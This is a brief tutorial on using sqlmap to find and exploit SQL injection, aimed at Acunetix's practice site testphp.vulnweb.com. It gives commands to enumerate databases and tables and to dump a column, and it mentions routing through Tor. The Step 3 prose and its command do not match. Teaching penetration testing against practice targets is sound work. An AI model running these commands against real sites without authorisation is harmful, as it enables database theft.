sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting 
SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features
for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching 
from the database, to accessing the underlying file system 
and executing commands on the operating system via out-of-band connections.

Step 1: List information about the existing databases 
So firstly, we have to enter the web url that we want to check along with the -u parameter. We may also use the –tor parameter if we wish to test the website using 
proxies. Now typically, we would want to test whether it is possible to gain access to a database. So we use the –dbs option to do so. –dbs lists all the available databases. 
 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs

Step 2: List information about Tables present in a particular Database 
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables

Step 3: List information about the columns of a particular table
we want to view the columns of a particular table, we can use the following command, in which we use -T 
to specify the table name, and –columns to query the column names. We will try to access the table ‘artists’. 

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
